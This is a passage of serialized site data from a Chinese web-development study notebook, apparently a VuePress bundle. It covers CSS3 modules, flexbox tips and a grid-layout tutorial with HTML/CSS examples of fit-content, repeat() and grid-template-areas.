定义css样式表的基本结构、样式表中的一些语法细节、浏览器对于样式的分析规则\ngenerated and replaced content      定义怎样在元素中插入内容\nmarquee                             定义当一些元素的内容太大，超过了指定的元素尺寸时，是否以及怎样显示溢出部分\nruby                                定义页面中ruby元素（用于显示拼音文字）的样式\nwriting modes                       定义页面中文本数据的布局方式\nbasic user interface                定义屏幕、纸张上进行输出时页面的渲染方式\nnamespaces                          定义使用命名空间时的语法\nmedia queries                       根据媒体类型来实现不同的样式\n‘reader’media type                  定义用于屏幕阅读器之类的阅读程序时的样式\nmulti-column layout                 在页面中使用多栏布局方式\ntemplate layout                     在页面中使用特殊布局方式\nflexible box layout                 创建自适应浏览器窗口的流动布局或自适应字体大小的弹性布局\ngrid position                       在页面中使用网络布局方式\ngenerated content for paged media   在页面中使用印刷时使用的布局方式\n\n\n# css长什么样子\n\ncss是由一个选择器(selector)起头，后面接一对大括号{ }，然后在大括号里面定义一些属性和对应的属性值。\n\nh1 {\n    color: red;\n    font-size: 5em;\n}\n\np {\n    color: black;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n",charsets:{cjk:!0}},{title:"css散记",frontmatter:{},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/css%E6%95%A3%E8%AE%B0.html",relativePath:"book-web/html、css、js、ts/学习CSS/css散记.md",key:"v-b5548f06",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/css%E6%95%A3%E8%AE%B0.html",lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:null,content:"# css散记\n\n 1.  在弹性盒模型布局中，需要事先指定一个容器，后续的所有布局操作都是基于此容器来定义的。其核心是容器会根据布局的需要（动态的）调整其中所包含的子元素（即布局条目）的尺寸、顺序来填充容器的所有可用空间。当容器的尺寸由于屏幕大小（或者浏览器窗口尺寸）发生变化时，其中包含的布局条目也会自动地进行调整（flex容器可以根据本身尺寸的大小来动态地调整flex条目的尺寸）。\n 2.  display: flex是用来指定弹性容器，flex是flex-grow、flex-shrink、flex-bsis的缩写，只写flex则是默认这三个属性值的组合。这三个css属性是确定flex条目尺寸的弹性的；flex-basis设置弹性条目的初始主轴尺寸；flex-grow当容器有多余的空间时，这些空间在不同条目之间的分配比例；flex-shrink是当容器的空间不足时，各个条目尺寸缩小的比例。\n     * 当flex为none时，flex-grow、flex-shrink、flex-bsis分别是0、0、auto；\n     * 当flex为auto时，flex-grow、flex-shrink、flex-bsis分别为1、1、auto；\n     * 当flex为非负数字时，则flex-grow为该数字，flex-shrink为1，flex-bsis为0%；\n     * 当flex为一个长度或百分比时，flex-grow和flex-shrink为1，flex-bsis为这个百分比；\n     * 当flex为两个非负数字时，则flex-grow、flex-shrink分别为那两个数字，flex-bsis为0%；\n     * 当flex为一个非负数字和一个百分比时，则flex-grow、flex-bsis分别为那两个值，flex-shrink为1。\n 3.  flex拓展：flex-direction设置主轴方向。flex-wrap设置当所有的flex条目的尺寸之和超过flex容器的主轴尺寸时应该采取的行为。order自定义容器中的条目顺序\n 4.  hight是元素内容高度，而line-hight是行高，不受元素的影响，line-height与font-size的计算值之差分为两半，分别加到一个文本行内容的顶部和底部，这样就形成了行间距。\n 5.  自适应方案之一:为了防止图片未加载而出现暂时的内容抖动，在垂直方向使用padding撑开容器；因为使用了padding撑开容器，而当容器添加内容进来，内容也会占据高度，所以让height为0，使添加进来的内容不占据高度\n     * padding-bottom: 50%\n     * height: 0\n 6.  box-sizing: border-box切换成IE盒子模型，而box-sizing: content-box是切换成W3C盒子模型\n 7.  overflow: hidden,white-space: nowrap,text-overflow: ellipsis。这个三个的意思分别是：超出部分隐藏，所有的文本都显示在这一行，多余的文本用省略号...显示\n 8.  移动端弹性盒子里溢出字体省略号替换不起作用，则加一句min-width: 0\n 9.  text-indent 属性规定文本块中首行文本的缩进\n 10. 把百分数作为内外边距，值是以内联尺寸进行计算的，也即对于左右书写的语言来说的宽度。\n 11. min-height可以确保最小高度，超过就会撑大可以解决溢出的问题；max-width，在没有足够空间以原有宽度展示图像时会缩小图片，这样就达到了图片自适应的效果。\n 12. flex:1可以自动撑开宽度\n 13. 引入border.css文件后可以在class里加入“border-bottom”就可以使用一像素解决方案，明显的在边框处有浅灰色的边框。\n 14. flex:1,min-width: 0，弹性盒子分配比例都是1，但最小宽度是0，那么能保证元素能最小获得父元素的宽度\n 15. type为text的input标签，想让它有默认浅色提示可以使用，placeholder属性。\n 16. overflow: hidden会触发BFC，使得带有overflow: hidden的元素成为BFC(块级格式化上下文)。因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理。\n 17. flex-direction: row | row-reverse | column | column-reverse\n     * row：横向从左到右排列（左对齐），默认的排列方式。\n     * row-reverse：反转横向排列（右对齐，从后往前排，最后一项排在最前面。\n     * column：纵向排列。\n     * row-reverse：反转纵向排列，从后往前排，最后一项排在最上面。\n 18. justify-content: flex-start | flex-end | center | space-between | space-around;\n     * flex-start: 弹性盒子元素将向行起始位置对齐。第一个元素与左起始边界对齐，后面的元素接着第一个元素进行排列。\n     * flex-end: 弹性盒子元素将向行结束位置对齐。整体靠着行结束的位置排列。\n     * center：整体居中显示。",normalizedContent:"# css散记\n\n 1.  在弹性盒模型布局中，需要事先指定一个容器，后续的所有布局操作都是基于此容器来定义的。其核心是容器会根据布局的需要（动态的）调整其中所包含的子元素（即布局条目）的尺寸、顺序来填充容器的所有可用空间。当容器的尺寸由于屏幕大小（或者浏览器窗口尺寸）发生变化时，其中包含的布局条目也会自动地进行调整（flex容器可以根据本身尺寸的大小来动态地调整flex条目的尺寸）。\n 2.  display: flex是用来指定弹性容器，flex是flex-grow、flex-shrink、flex-bsis的缩写，只写flex则是默认这三个属性值的组合。这三个css属性是确定flex条目尺寸的弹性的；flex-basis设置弹性条目的初始主轴尺寸；flex-grow当容器有多余的空间时，这些空间在不同条目之间的分配比例；flex-shrink是当容器的空间不足时，各个条目尺寸缩小的比例。\n     * 当flex为none时，flex-grow、flex-shrink、flex-bsis分别是0、0、auto；\n     * 当flex为auto时，flex-grow、flex-shrink、flex-bsis分别为1、1、auto；\n     * 当flex为非负数字时，则flex-grow为该数字，flex-shrink为1，flex-bsis为0%；\n     * 当flex为一个长度或百分比时，flex-grow和flex-shrink为1，flex-bsis为这个百分比；\n     * 当flex为两个非负数字时，则flex-grow、flex-shrink分别为那两个数字，flex-bsis为0%；\n     * 当flex为一个非负数字和一个百分比时，则flex-grow、flex-bsis分别为那两个值，flex-shrink为1。\n 3.  flex拓展：flex-direction设置主轴方向。flex-wrap设置当所有的flex条目的尺寸之和超过flex容器的主轴尺寸时应该采取的行为。order自定义容器中的条目顺序\n 4.  hight是元素内容高度，而line-hight是行高，不受元素的影响，line-height与font-size的计算值之差分为两半，分别加到一个文本行内容的顶部和底部，这样就形成了行间距。\n 5.  自适应方案之一:为了防止图片未加载而出现暂时的内容抖动，在垂直方向使用padding撑开容器；因为使用了padding撑开容器，而当容器添加内容进来，内容也会占据高度，所以让height为0，使添加进来的内容不占据高度\n     * padding-bottom: 50%\n     * height: 0\n 6.  box-sizing: border-box切换成ie盒子模型，而box-sizing: content-box是切换成w3c盒子模型\n 7.  overflow: hidden,white-space: nowrap,text-overflow: ellipsis。这个三个的意思分别是：超出部分隐藏，所有的文本都显示在这一行，多余的文本用省略号...显示\n 8.  移动端弹性盒子里溢出字体省略号替换不起作用，则加一句min-width: 0\n 9.  text-indent 属性规定文本块中首行文本的缩进\n 10. 把百分数作为内外边距，值是以内联尺寸进行计算的，也即对于左右书写的语言来说的宽度。\n 11. min-height可以确保最小高度，超过就会撑大可以解决溢出的问题；max-width，在没有足够空间以原有宽度展示图像时会缩小图片，这样就达到了图片自适应的效果。\n 12. flex:1可以自动撑开宽度\n 13. 引入border.css文件后可以在class里加入“border-bottom”就可以使用一像素解决方案，明显的在边框处有浅灰色的边框。\n 14. flex:1,min-width: 0，弹性盒子分配比例都是1，但最小宽度是0，那么能保证元素能最小获得父元素的宽度\n 15. type为text的input标签，想让它有默认浅色提示可以使用，placeholder属性。\n 16. overflow: hidden会触发bfc，使得带有overflow: hidden的元素成为bfc(块级格式化上下文)。因为bfc内部的元素和外部的元素绝对不会互相影响，因此， 当bfc外部存在浮动时，它不应该影响bfc内部box的布局，bfc会通过变窄，而不与浮动有重叠。同样的，当bfc内部有浮动时，为了不影响外部元素的布局，bfc计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理。\n 17. flex-direction: row | row-reverse | column | column-reverse\n     * row：横向从左到右排列（左对齐），默认的排列方式。\n     * row-reverse：反转横向排列（右对齐，从后往前排，最后一项排在最前面。\n     * column：纵向排列。\n     * row-reverse：反转纵向排列，从后往前排，最后一项排在最上面。\n 18. justify-content: flex-start | flex-end | center | space-between | space-around;\n     * flex-start: 弹性盒子元素将向行起始位置对齐。第一个元素与左起始边界对齐，后面的元素接着第一个元素进行排列。\n     * flex-end: 弹性盒子元素将向行结束位置对齐。整体靠着行结束的位置排列。\n     * center：整体居中显示。",charsets:{cjk:!0}},{title:"9.网格布局",frontmatter:{title:"9.网格布局"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/9.%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80.html",relativePath:"book-web/html、css、js、ts/学习CSS/9.网格布局.md",key:"v-1e5fcb02",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0CSS/9.%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80.html",headers:[{level:2,title:"一、网格布局简介",slug:"一、网格布局简介",normalizedTitle:"一、网格布局简介",charIndex:11},{level:2,title:"二、网格容器组成",slug:"二、网格容器组成",normalizedTitle:"二、网格容器组成",charIndex:469},{level:2,title:"三、放置网格线",slug:"三、放置网格线",normalizedTitle:"三、放置网格线",charIndex:840},{level:3,title:"3.1 固定轨道",slug:"_3-1-固定轨道",normalizedTitle:"3.1 固定轨道",charIndex:1126},{level:3,title:"3.2 弹性轨道",slug:"_3-2-弹性轨道",normalizedTitle:"3.2 弹性轨道",charIndex:3932},{level:3,title:"3.3 内容适配轨道",slug:"_3-3-内容适配轨道",normalizedTitle:"3.3 内容适配轨道",charIndex:7147},{level:3,title:"3.4 重复网格线",slug:"_3-4-重复网格线",normalizedTitle:"3.4 重复网格线",charIndex:9080},{level:3,title:"3.5 网格区域",slug:"_3-5-网格区域",normalizedTitle:"3.5 网格区域",charIndex:13264},{level:2,title:"四、添加网格元素",slug:"四、添加网格元素",normalizedTitle:"四、添加网格元素",charIndex:15601},{level:3,title:"4.1 附加到网格线上",slug:"_4-1-附加到网格线上",normalizedTitle:"4.1 附加到网格线上",charIndex:15614},{level:3,title:"4.2 隐式网格",slug:"_4-2-隐式网格",normalizedTitle:"4.2 隐式网格",charIndex:24549},{level:3,title:"4.3 附加到网格区域中",slug:"_4-3-附加到网格区域中",normalizedTitle:"4.3 附加到网格区域中",charIndex:31886},{level:3,title:"4.4 元素重叠以及异常处理",slug:"_4-4-元素重叠以及异常处理",normalizedTitle:"4.4 元素重叠以及异常处理",charIndex:35085},{level:2,title:"五、网格流",slug:"五、网格流",normalizedTitle:"五、网格流",charIndex:37254},{level:3,title:"5.1 行优先和列优先",slug:"_5-1-行优先和列优先",normalizedTitle:"5.1 行优先和列优先",charIndex:37264},{level:3,title:"5.2 网格流和浮动的区别",slug:"_5-2-网格流和浮动的区别",normalizedTitle:"5.2 网格流和浮动的区别",charIndex:39851},{level:3,title:"5.3 密集流",slug:"_5-3-密集流",normalizedTitle:"5.3 密集流",charIndex:44005},{level:2,title:"六、元素在网格空间中的布局",slug:"六、元素在网格空间中的布局",normalizedTitle:"六、元素在网格空间中的布局",charIndex:47827},{level:3,title:"6.1 栏距",slug:"_6-1-栏距",normalizedTitle:"6.1 栏距",charIndex:47845},{level:3,title:"6.2 网格元素的盒模型",slug:"_6-2-网格元素的盒模型",normalizedTitle:"6.2 网格元素的盒模型",charIndex:49741},{level:3,title:"6.3 网格元素的绝对定位",slug:"_6-3-网格元素的绝对定位",normalizedTitle:"6.3 网格元素的绝对定位",charIndex:51358},{level:2,title:"七、网格的对齐方式",slug:"七、网格的对齐方式",normalizedTitle:"七、网格的对齐方式",charIndex:52540},{level:3,title:"7.1 xxx-self",slug:"_7-1-xxx-self",normalizedTitle:"7.1 xxx-self",charIndex:52881},{level:3,title:"7.2 xxx-items",slug:"_7-2-xxx-items",normalizedTitle:"7.2 xxx-items",charIndex:56897},{level:3,title:"7.3 xxx-content",slug:"_7-3-xxx-content",normalizedTitle:"7.3 xxx-content",charIndex:57028},{level:2,title:"八、分层和排序",slug:"八、分层和排序",normalizedTitle:"八、分层和排序",charIndex:61007}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、网格布局简介 二、网格容器组成 三、放置网格线 3.1 固定轨道 3.2 弹性轨道 3.3 内容适配轨道 3.4 重复网格线 3.5 网格区域 四、添加网格元素 4.1 附加到网格线上 4.2 隐式网格 4.3 附加到网格区域中 4.4 元素重叠以及异常处理 五、网格流 5.1 行优先和列优先 5.2 网格流和浮动的区别 5.3 密集流 六、元素在网格空间中的布局 6.1 栏距 6.2 网格元素的盒模型 6.3 网格元素的绝对定位 七、网格的对齐方式 7.1 xxx-self 7.2 xxx-items 7.3 xxx-content 八、分层和排序",content:'# 网格布局\n\n\n# 一、网格布局简介\n\n网格(Grid)布局是一种二维布局，将内容按照行与列的格式进行排版。可以定义网格线的重复模式，将元素附加到这些网格线上。\n\n通过声明display: grid或display: inline-grid在元素上激活Grid布局。该元素会作为一个网格容器，与flex布局类似，让直接子元素作为网格项，其他后代并不会成为网格项。\n\nPS：浮动元素会遮盖后方紧挨着的块级元素，但不会遮盖后方紧挨着的网格容器。块级元素嵌套可能会有外边距折叠，而网格容器嵌套是没有外边距嵌套的。\n\n有一些 CSS 属性和特性并不适用于网格容器和网格项：\n\n * css3的多列属性（column-count、column-width等）应用在Grid容器时会被忽略；\n * 伪元素::first-line和::first-letter应用在Grid容器时会被忽略；\n * float和clear应用在Grid容器时会被忽略；float对网格项还是有影响的；\n * vertical-align对Grid项没有影响。\n\n\n# 二、网格容器组成\n\nGrid容器是一个“容器”，换句话说，它是一个“格式上下文”。在BFC就提到过这个概念，它是页面中一个独立的渲染区域，拥有自己的渲染规则，会隔离内部元素与外部元素。\n\n\n\n * 网格轨道（grid track）是两个相邻的网格线之间的连续轨道。列轨道其实是块轴轨道，行轨道其实是内联轨道。\n * 网格单元（grid cell）是由四条网格线围绕的空间，没有网格线贯穿其中，类似于表格单元。它不能直接用CSS网格属性来处理。\n * 网格区域（grid area）是由四条网格线围成的矩形区域，由一个或多个网格单元组成。它可以使用CSS网格属性来处理，并将网格项与它们关联。\n\n值得注意的是网格项并不是与网格区域强关联的，网格区域可以不放网格项。网格区域可以重叠，也就是它们共用网格单元，对应的网格项也就可以重叠了。\n\n\n# 三、放置网格线\n\ngrid-template-rows与grid-template-columns是用于定义（放置）网格线的，取值是none | <track-list> | <auto-track-list>。其中none表示不明确的网格（默认值），所有的行和其大小都将由grid-auto-rows属性隐式的指定。<track-list> | <auto-track-list>就比较复杂了，后面会一一介绍。\n\n网格线是可以进行命名的，使用数字编号或者其他字词，也是可以数字和字词混用也就是有多个名字，不过要注意网格线不要重复命名（分属于行和列的可以重复）。\n\n\n# 3.1 固定轨道\n\n让grid-template-rows和grid-template-columns取相对固定的值。非负值的长度大小<length>，非负值且相对于网格容器的<percentage>。\n\n这里说的“固定”意思是网格线之间的距离不随网格轨道中内容的变化而变化。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: inline-grid;\n        /* 固定宽度，并且给网格线进行命名 */\n        grid-template-columns: [start col-a] 200px [col-b] 50% [col-c] 100px [stop end last];\n        /* 固定宽度，并且给网格线进行命名。可以将其中的80%换成minmax(300px, 400px) */\n        grid-template-rows: [start masthead] 50px [content] 80% [footer] 30px [stop end];\n        width: 700px; height: 400px; border: 1px solid;\n    }\n    .gridlines { text-align: center; border: 1px dashed; }\n    ul li { display: flex; }\n    ul li i { color: rebeccapurple; }\n    .labels1 {\n        display: grid; grid-template-columns: 200px 50% 100px 50px;\n        width: 700px; padding: 0; margin-bottom: 0;\n    }\n    .labels1 li {\n        justify-content: flex-end; align-items: start; flex-flow: column; border-left: 1px solid;\n    }\n    .labels2 {\n        display: inline-grid; grid-template-rows: 50px 80% 30px;\n        height: 400px; padding: 0; margin-left: 0; margin-top: 0; vertical-align: top;\n    }\n    .labels2 li { border-top: 1px solid; }\n    .labels2 li i::after { content: " || "; margin-right: 4px; }\n    .labels2 li i:last-child::after { content: ""; }\n    </style>\n</head>\n<body>\n    <section>\n        <ul class="labels1">\n            <li class="col"><i>start</i><i>col-a</i><i>1</i></li>\n            <li class="col"><i>col-b</i><i>2</i></li>\n            <li class="col"><i>col-c</i><i>3</i></li>\n            <li class="col"><i>stop</i><i>end</i><i>last</i><i>4</i></li>\n        </ul>\n        <div class="grid">\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span><span class="gridlines"></span>\n            <span class="gridlines"></span>\n        </div>\n        <ul class="labels2">\n            <li class="col"><i>start</i><i>masthead</i><i>1</i></li>\n            <li class="col"><i>content</i><i>2</i></li>\n            <li class="col"><i>footer</i><i>3</i></li>\n            <li class="col"><i>stop</i><i>end</i><i>4</i></li>\n        </ul>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n代码效果图：\n\n\n上面这个例子里第二列的宽度是网格容器的一半大小，虽然会随着网格容器宽度而变化，但不会根据网格项的内容而变化。\n\n如果第二行content的高度为100%，它会将第三行挤出网格容器，这不会我们想要的结果，那么可以使用minmax(a, b)来约束第二行content的高度，其中“a”是最小尺寸，“b”是最大尺寸。grid-template-rows: [start masthead] 50px [content] minmax(320px, 100%) [footer] 30px [stop end];\n\nminmax(a, b)中，如果“b”小于“a”，“b”将会被抛弃，“a”会作为固定值使用。觉得minmax(a, b)不好用那可以试试calc()。\n\n\n# 3.2 弹性轨道\n\n让grid-template-rows与grid-template-columns取比较灵活的值，fr单位就可以将可用（剩余）空间按照比例进行分配。例如grid-template-columns: 1fr 1fr 1fr 1fr;相当于grid-template-columns: 25% 25% 25% 25%;。另外就是固定轨道和弹性轨道混搭使用，可以看下面的例子\n\n<html>\n<head>\n    <style>\n    section {position: relative;}\n    .grid {\n        display: grid; width: 800px; height: 15em;\n        grid-template-columns: 15em 4.5fr 3fr 10%;\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    .gridlines { display: grid; border: 1px dashed; }\n    .gridlines i { height: 1.2em; }\n    .gridlines i.col.measure {\n        align-self: center; justify-self: stretch;\n        text-align: center; height: 1.2em;\n    }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid boxed lines">\n            <span class="gridlines"><i class="col measure">15em</i></span>\n            <span class="gridlines"><i class="col measure">4.5fr</i></span>\n            <span class="gridlines"><i class="col measure">3fr</i></span>\n            <span class="gridlines"><i class="col measure">10%</i></span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n代码效果图：\n\n\n也可以使用minmax(a, b)，例如grid-template-columns: 15em 4.5fr 3fr 10%;改为grid-template-columns: 15em 4.5fr minmax(5em, 3fr) 10%;，但要记住fr不能用在minmax的第一个参数上。改成grid-template-columns: 15em 1fr minmax(0, 500px) 10%;，如果不考虑边框的话，第一列占据240px，第二列的1fr实际占据0（这个是最后算的），第三列是480px，第四列是80px。\n\n但是如果第二列里有内容，它就不会是0px了。由于第二列的每一项的宽度可能不一致，就需要min-content或max-content来约束。min-content表示内容尽可能窄，对于一段文本来说就是保证最长的单词在一行里，这样会有很多换行。max-content表示内容尽可能宽，对于一段文本来说就是不换行。如果每一列都使用max-content，那很有可能导致网格元素溢出，所以max-content经常搭配minmax(a, b)来使用（但可能会发生重叠）。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: grid; width: 250px; height: 150px;\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    #div1 {\n        grid-template-columns:\n            max-content max-content\n            max-content max-content;\n    }\n    #div2 {\n        grid-template-columns:\n            minmax(0, max-content) minmax(0, max-content)\n            minmax(0, max-content) minmax(0, max-content);\n    }\n    .gridlines { border: 1px dashed; }\n    .block {\n        width: 50px; height: 50px;\n        background-color: blue;\n        opacity: 0.5; margin: 10px;\n    }\n    </style>\n</head>\n<body>\n    <div class="grid" id="div1">\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="width: 100px;"></div></div>\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="height: 100px;"></div></div>\n    </div>\n    <br>\n    <div class="grid" id="div2">\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="width: 100px;"></div></div>\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="height: 100px;"></div></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n代码效果图：\n\n\n还可以使用auto，一般要么作为最小值要么作为最大值使用。其实使用auto时，是由align-content和justify-content来决定网格元素尺寸的，在后面几节了会讲。\n\n\n# 3.3 内容适配轨道\n\nmin-content、max-content和minmax(a, b)会比较局限，对每一行内容做不到比较完美的适配。fit-content()函数就比较适合用来适配内容大小的，规范里有这样一个伪公式：fit-content(arg) => min(max-content, max(min-content, arg))，可以理解为取“中间”那个合适的值作为网格尺寸。\n\n<html>\n<head>\n    <style>\n    .grid  {\n        display: grid;\n        grid-template-columns: fit-content(200px) fit-content(200px) fit-content(200px);\n        border: 1px solid;\n    }\n    p { border: 1px dotted; margin: 0; padding: 10px 0; }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid">\n            <p>Short content, 29 characters.</p>\n            <p>This is longer content, which reaches a total of 63 characters.</p>\n            <p>This is still longer content, going on and on, causing line-wraps and the growth of the row’s height as it makes its way up to 151 characters in total.</p>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    .grid  {\n        display: grid;\n        grid-template-columns: fit-content(200px) fit-content(200px) fit-content(200px);\n        border: 1px solid;\n    }\n    p { border: 1px dotted; margin: 0; padding: 10px 0; }\n    .img { width: 250px; height: 50px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid">\n            <p>Short content, 29 characters.</p>\n            <p><img class="img" />This is longer content, which reaches a total of 63 characters.</p>\n            <p>This is still longer content, going on and on, causing line-wraps and the growth of the row’s height as it makes its way up to 151 characters in total.</p>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n以上代码效果图：\n\n\n上面第二个例子中有一个img图像，第二列的min-content就是img的宽度也就是250px，max-content就是一段文本不换行的长度这里应该是非常大的（估计有500px）。又因为fit-content(200px)，可以带入伪公式：fit-content(200px) => min(500px, max(250px, 200px))，最后结果是250px。\n\n\n# 3.4 重复网格线\n\n我们前面的例子每一列的取值基本一样，其实可以使用repeat()函数来简化。比如要设置5个轨道，并且都是50px宽，那么可以.grid { display: grid; grid-template-columns: repeat(5, 50px); }。除了单个单个重复的，还能一系列一系列重复的，比如要设置3个3em-1fr-1fr，那么可以.grid { display: grid; grid-template-columns: repeat(3, 3em 1fr 1fr); }。\n\n<html>\n<head>\n    <style>\n    section {position: relative;}\n    .grid {\n        display: grid; width: 800px; height: 15em;\n        /* grid-template-columns: repeat(3, 3em 1fr 1fr) 3em; 可以平衡两端 */\n        grid-template-columns: repeat(3, 3em 1fr 1fr);\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    .gridlines { display: grid; border: 1px dashed; }\n    .gridlines i { height: 1.2em; }\n    .gridlines i.col.measure {\n        align-self: center; justify-self: stretch;\n        text-align: center; height: 1.2em;\n    }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid boxed lines">\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n以上代码效果图：\n\n\n如果网格容器宽度或者高度固定，我们可以使用repeat(auto-fill, xx)自动填充网格，也就是将具体数值替换为auto-fill。这样的写法有个局限就是不能使用在“一系列一系列重复”网格中，也就是只有一个固定尺寸。还可以联合使用比如grid-template-columns: repeat(3, 20em) repeat(auto-fill, 4em);，也可以反过来grid-template-columns: repeat(auto-fill, 4em) repeat(3, 20em);，可以反过来的原因就是始终先算固定尺寸（3个20em），再用剩余空间算自动填充的（剩余的一些4em）。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: grid; width: 77em; height: 10em; border: 1px solid;\n        grid-template-columns: repeat(auto-fill, 4em) repeat(3, 20em);\n    }\n    span { border: 1px dashed; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n以上代码效果图：\n\n\n类似的还有repeat(auto-fit, xx)，与前面的repeat(auto-fill, xx)功能相同都是自动填充网格，区别就是使用auto-fit会剔除不使用的网格轨道（内部没有网格元素）。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid; width: auto; height: 10em; border: 1px solid; }\n    .grid:nth-of-type(1) { grid-template-columns: repeat(auto-fit, 10em); }\n    .grid:nth-of-type(2) { grid-template-columns: repeat(auto-fill, 10em); }\n    span { border: 1px dashed; }\n    .box01 { grid-column: 1; }\n    .box02 { grid-column: 2; }\n    .box03 { grid-column: 4; }\n    .box04 { grid-column: 5; }\n    .box05 { grid-column: 7; }\n\n    p { text-align: center; font: bold 1em Consolas, monospace, sans-serif; margin: 1ch;}\n    </style>\n</head>\n<body>\n    <section>\n        <p>repeat(auto-fit, 20em)</p>\n        <div class="grid">\n            <span class="box01">1</span>\n            <span class="box02">2</span>\n            <span class="box03">4</span>\n            <span class="box04">5</span>\n            <span class="box05">7</span>\n        </div>\n        <p>repeat(auto-fill, 20em)</p>\n        <div class="grid">\n            <span class="box01">1</span>\n            <span class="box02">2</span>\n            <span class="box03">4</span>\n            <span class="box04">5</span>\n            <span class="box05">7</span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 3.5 网格区域\n\ngrid-template-areas用于给网格划分区域的，直接定义网格区域。可以使用特定的字母或者单词来规定某块区域属于哪一块，比如header、leftside、rightside、centent和footer，也可以使用它们的首字母进行替代。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid;\n            grid-template-areas:\n            "h h h h"\n            "l c c r"\n            "l f f f";\n        grid-template-rows: repeat(3, 3em);\n        border: 1px solid;\n    }\n    span { border: 1px dashed; text-align: center; }\n    .header { grid-area: h; }\n    .leftside { grid-area: l; }\n    .rightside { grid-area: r; }\n    .content { grid-area: c; }\n    .footer { grid-area: f; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="box01 header">header</span>\n        <span class="box02 content">content</span>\n        <span class="box03 leftside">leftside</span>\n        <span class="box04 rightside">rightside</span>\n        <span class="box05 footer">footer</span>\n    